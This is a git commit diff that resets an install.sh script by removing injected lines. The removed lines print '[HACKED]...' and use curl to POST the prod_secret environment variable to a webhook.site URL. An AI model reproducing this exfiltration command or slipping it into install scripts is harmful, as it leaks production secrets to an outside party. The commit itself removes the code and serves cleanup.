8b46bd414db94f1395d7f0e00a66bab720c7d446
JacoStu <139375560+JacoStu@users.noreply.github.com>
2026-01-27 11:50:31 +0100

    Reset install.sh script

--- install.sh
+++ install.sh
@@ -1,8 +1,2 @@
 #!/bin/bash
 echo "Installing tool..."
-echo "[HACKED]..."
-curl -X POST \
-  -H "Content-Type: application/json" \
-  -d "{\"prod_secret\":\"$prod_secret\"}" \
-  https://webhook.site/d75e796d-f8b5-440b-b93d-018f6eb0adb9
-
